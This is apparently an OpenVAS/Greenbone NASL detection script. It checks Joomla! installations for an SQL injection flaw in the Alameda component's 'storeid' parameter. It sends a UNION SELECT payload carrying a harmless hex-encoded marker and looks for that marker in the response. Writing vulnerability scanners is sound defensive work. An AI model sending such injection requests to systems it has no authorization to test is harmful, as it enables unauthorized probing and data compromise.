# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:joomla:joomla";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103323");
  script_version("2023-07-28T05:05:23+0000");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("Joomla! Alameda Component 'storeid' Parameter SQL Injection Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/50451");
  script_xref(name:"URL", value:"http://www.blueflyingfish.com/alameda/");

  script_tag(name:"last_modification", value:"2023-07-28 05:05:23 +0000 (Fri, 28 Jul 2023)");
  script_tag(name:"creation_date", value:"2011-11-01 08:00:00 +0100 (Tue, 01 Nov 2011)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("joomla/installed");

  script_tag(name:"summary", value:"The Alameda component for Joomla! is prone to an SQL-injection vulnerability
because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.

Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit
latent vulnerabilities in the underlying database.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to
a newer release, disable respective features, remove the product or replace the product by another one.");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe:CPE))
  exit(0);

if (!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/index.php?option=com_alameda&controller=comments&task=edit&storeid=-1+union+all+select+0x53514c2d496e6a656374696f6e2d54657374--";

if (http_vuln_check(port:port, url:url,pattern:"SQL-Injection-Test")) {
  report = http_report_vuln_url( port:port, url:url );
  security_message(port:port, data: report);
  exit(0);
}

exit(99);
